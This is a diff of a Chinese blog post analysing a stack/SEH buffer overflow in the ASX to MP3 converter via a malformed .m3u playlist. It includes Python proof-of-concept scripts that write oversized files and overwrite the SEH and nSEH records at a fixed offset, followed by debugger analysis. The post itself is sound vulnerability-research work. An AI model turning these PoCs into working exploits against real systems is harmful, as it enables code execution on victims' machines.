@@ -21,7 +21,11 @@
 </ol>
 <h3 id="原博中的分析思路复现"><a href="#原博中的分析思路复现" class="headerlink" title="原博中的分析思路复现"></a>原博中的分析思路复现</h3><p>利用poc生成一个畸形m3u文件，播放器打开文件，程序崩溃</p>
 <p>PoC:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">poc = <span class="string">&quot;\x41&quot;</span> * <span class="number">50000</span></span><br><span class="line"></span><br><span class="line">rst = <span class="built_in">open</span>(<span class="string">&quot;exploit.m3u&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">rst.write(poc)</span><br><span class="line">rst.close();</span><br></pre></td></tr></table></figure>
+<pre><code class="python">poc = &quot;\x41&quot; * 50000
+
+rst = open(&quot;exploit.m3u&quot;,&#39;w&#39;)
+rst.write(poc)
+rst.close();</code></pre>
 <p>原文理想中的情况应该是：</p>
 <p>1.使用windbg到达漏洞现场，使用kb发现堆栈调用全是系统dll的调用，无法回溯漏洞发生前的关键函数，于是更改思路</p>
 <p>2.想到该漏洞是一个文件格式的poc，那么在主程序中很有可能会通过fopen调用这个poc打开，以读取其中的文件从而触发文件格式的漏洞，于是想办法通过fopen函数来定位到漏洞发生前的函数</p>
@@ -70,11 +74,34 @@
 <p>看到这里有没有朋友发现奇怪的地方，在第二部分原博复现：我实际的操作第3步中分析了程序不像原博中一样执行到了最后而是在中间断开的原因，起端就是如下图这个位置堆栈DBFB4的非法数据mov进了ecx，最终导致内存读写错误，而DBFB4的非法数据从何而来我们从上图就可以一清二楚</p>
 <p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdwjvt9oetj315w0ng77f.jpg" alt="image-20200417102251074"></p>
 <p>如果我们想要复现原博中的情况，让它执行到最后再跳转错误，只需要在构造poc时，中间多垫几层，在DBFB4位置输入一个合法地址就可以了，此时poc应该为</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">poc = <span class="string">&quot;\x41&quot;</span> * <span class="number">43483</span> SEH偏移</span><br><span class="line">poc += <span class="string">&quot;\x42\x42\x42\x42&quot;</span>   ；覆盖Nseh</span><br><span class="line">poc += <span class="string">&quot;\x41\x41\x41\x41&quot;</span>   ;覆盖SEH</span><br><span class="line">poc += <span class="string">&quot;\x90&quot;</span>*<span class="number">8</span></span><br><span class="line">poc += <span class="string">&quot;\xCC\xC7\x10\x00&quot;</span>  ；防止过程中内存读写出错构造的跳转地址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rst = <span class="built_in">open</span>(<span class="string">&quot;exploit.m3u&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">rst.write(poc)</span><br><span class="line">rst.close();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="python">poc = &quot;\x41&quot; * 43483 SEH偏移
+poc += &quot;\x42\x42\x42\x42&quot;   ；覆盖Nseh
+poc += &quot;\x41\x41\x41\x41&quot;   ;覆盖SEH
+poc += &quot;\x90&quot;*8
+poc += &quot;\xCC\xC7\x10\x00&quot;  ；防止过程中内存读写出错构造的跳转地址
+
+
+
+rst = open(&quot;exploit.m3u&quot;,&#39;w&#39;)
+rst.write(poc)
+rst.close();
+</code></pre>
 <p>构建地址后，成功继续向下走，分析过程就与原博基本相同了，但是在最后一步retn 4时，发现跳转为90909090也就是nop而不是A，仔细看堆栈，位置为DC5B8正好为防止内存出错构造地址的上一条</p>
 <p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdxorir6p5j318m0d3gn5.jpg" alt="image-20200418095722792"></p>
 <p>则poc进一步改为</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">poc = <span class="string">&quot;\x41&quot;</span> * <span class="number">43483</span> SEH偏移</span><br><span class="line">poc += <span class="string">&quot;\x42\x42\x42\x42&quot;</span>   ；覆盖Nseh</span><br><span class="line">poc += <span class="string">&quot;\x41\x41\x41\x41&quot;</span>   ;覆盖SEH</span><br><span class="line">poc += <span class="string">&quot;\x90&quot;</span>*<span class="number">4</span></span><br><span class="line">poc += <span class="string">&quot;\x41\x41\x41\x41&quot;</span>  ;原博程序末尾 retn <span class="number">4</span> 跳转的地址</span><br><span class="line">poc += <span class="string">&quot;\xCC\xC7\x10\x00&quot;</span>  ；防止过程中内存读写出错构造的跳转地址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rst = <span class="built_in">open</span>(<span class="string">&quot;exploit.m3u&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">rst.write(poc)</span><br><span class="line">rst.close();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="python">poc = &quot;\x41&quot; * 43483 SEH偏移
+poc += &quot;\x42\x42\x42\x42&quot;   ；覆盖Nseh
+poc += &quot;\x41\x41\x41\x41&quot;   ;覆盖SEH
+poc += &quot;\x90&quot;*4
+poc += &quot;\x41\x41\x41\x41&quot;  ;原博程序末尾 retn 4 跳转的地址
+poc += &quot;\xCC\xC7\x10\x00&quot;  ；防止过程中内存读写出错构造的跳转地址
+
+
+
+rst = open(&quot;exploit.m3u&quot;,&#39;w&#39;)
+rst.write(poc)
+rst.close();
+</code></pre>
 <p>至此分析结束，进一步的利用exp可以在这个poc基础上改。</p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>综合看下来，该漏洞并不是由于fopen而产生的，具体产生原因应该是应用程序自带的MSA2Mfilter03.dll组件内Playlist_FindNextItem函数解析恶意.M3U文件时不正确的边界检查引起的，溢出点在1000D3C3地址处，REP MOVS循环，其实是使用函数strcpy完成循环复制，问题就出现在strcpy函数，精心构造的POC可导致SEH指针被覆盖，因此在函数结束时，程序返回到一个不可读的地址，从而触发了异常处理流程，关键节点的地址均可在poc中改变，程序可控。</p>
 <h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p>ASX TO MP3本地代码执行漏洞 <a target="_blank" rel="noopener" href="https://whereisk0shl.top/post/2016-11-04">https://whereisk0shl.top/post/2016-11-04</a></p>
